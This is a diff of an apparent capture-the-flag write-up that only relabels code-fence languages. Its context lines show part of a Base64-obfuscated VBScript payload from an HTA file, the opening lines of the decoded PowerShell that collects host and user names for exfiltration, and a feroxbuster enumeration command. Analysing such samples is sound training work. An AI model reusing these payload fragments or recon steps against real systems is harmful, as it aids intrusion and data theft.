@@ -32,7 +32,7 @@ The HTA file contained a **heavily obfuscated VBScript payload**.
 
 The critical data was stored in a variable `p`, which contained a **fragmented Base64 string** split across multiple lines and concatenated with VBScript operators.
 
-```json
+```python
 p = "JGg9JGVudjpDT01QVVRFUk5BTUUKJHU9JGVudjpVU0VSTkFNRQokaz0yMwokZD0nbmtkWlVCb2REUjBYRnhjYVhsOVRSUmNYRllzWEZ4Uy9IeEVYRnhkcndETzlGeGMzRjE1VFZrTnZ6ZnVxYm84emNHS3c3SWs0Slh5NC9VS3F2cXpDelUxY2ZINDZIeDZXei9adEo1" & _
 [...]
 ```
@@ -43,7 +43,7 @@ The obfuscation included **line breaks, whitespace, and concatenation operators*
 
 After reconstructing and decoding the Base64 string, the HTA revealed a **PowerShell payload** responsible for exfiltrating environment information and a second encrypted payload.
 
-```json
+```powershell
 $h=$env:COMPUTERNAME
 $u=$env:USERNAME
 $k=23
@@ -168,7 +168,7 @@ sbreachblocker@easterbunnies.thm
 
 The first step in the assessment was a comprehensive **web content enumeration** using `feroxbuster` with a large wordlist and multiple file extensions:
 
-```php
+```python
 feroxbuster \
  -u https://<IP>:8443 \
  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt \
